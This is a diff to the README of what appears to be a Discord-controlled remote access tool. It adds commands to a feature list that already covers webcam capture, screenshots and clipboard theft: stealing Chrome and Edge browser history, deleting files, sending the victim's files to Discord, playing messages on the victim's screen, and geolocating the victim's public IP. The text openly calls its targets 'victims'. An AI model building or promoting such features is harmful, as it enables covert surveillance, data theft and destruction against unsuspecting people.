@@ -17,6 +17,11 @@ DOWNLOAD THE FILE AS A WHOLE ( AS A ZIP ). OPEN "getrequirements.bat", wait for 
 1. !webcam -- Take an image of the webcam and send it
 2. !screenshot -- Takes an screenshot of the victims monitor and send it
 3. !clipboard -- Takes the content of the victims clipboard and sends it
+4. !browser -- Takes browser history of chrome and edge
+5. !delete ( file path ) -- Deletes file in that certain path
+6. !download ( file path ) -- Sends file to discord
+7. !tts message -- Plays a message on victims screen
+8. !ip -- Grab victims PUBLIC IP and geolocates it.
 
 
 # SUPPORTED BROWSERS 
